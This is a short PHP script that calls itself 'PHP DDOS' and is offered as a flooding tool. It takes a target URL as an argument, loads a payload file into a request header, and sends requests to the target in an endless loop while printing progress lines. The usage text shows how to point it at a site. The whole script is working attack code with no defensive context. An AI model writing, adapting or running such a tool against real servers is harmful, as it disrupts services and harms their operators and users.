<?php
error_reporting(0);
echo "\n###########################\n";
echo "# PHP DDOS By Afrizal F.A #\n";
echo "###########################\n";
if(!empty($argv[1])) {
echo "\nPreparing Buffer Attack To ==> $argv[1]\n\n";
sleep(3);
$packet = file_get_contents('paket.txt');
$buffer = "User-Agent:\n$packet";
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL, $argv[1]);
curl_setopt($ch ,CURLOPT_HTTPHEADER, $buffer);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$bacok = curl_exec($ch);
if($bacok) {
} else {
echo "Target Off\n";
exit;
}
while(true){
curl_exec($ch);
echo "Send Buffer To ==> $argv[1]\n";
}
} else {
$per = "Help ?\n\n
Command : php ddos.php http://target.con\n";
echo $per;
}
?>